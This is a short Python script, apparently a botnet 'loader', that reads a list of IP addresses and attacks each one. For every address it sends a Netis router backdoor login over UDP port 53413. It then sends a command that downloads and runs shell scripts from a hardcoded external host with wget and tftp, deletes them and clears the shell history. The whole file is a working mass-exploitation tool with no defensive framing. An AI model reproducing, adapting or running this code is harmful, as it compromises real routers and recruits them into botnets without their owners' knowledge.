#!/usr/bin/python
# netis loader
# by light

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

loginpayload = "AAAAAAAAnetcore\x00"
commandpayload = "AA\x00\x00AAAA cd /tmp; wget http://167.88.114.40/w.sh;chmod 777 w.sh;sh w.sh;tftp 167.88.114.40 -c get t.sh;chmod 777 t.sh;sh t.sh;rm -rf w.sh t.sh;history -c"
list = open(sys.argv[1], "r").readlines()
offline = 0
class netis(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			try:
				print "\033[31m[\033[32m+\033[31m] \033[32mAttempting:\033[32m %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1.5)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(30)
			except Exception:
				pass
for ip in list:
	try:
		t = netis(ip)
		t.start()
		time.sleep(0.01)
	except:
		pass
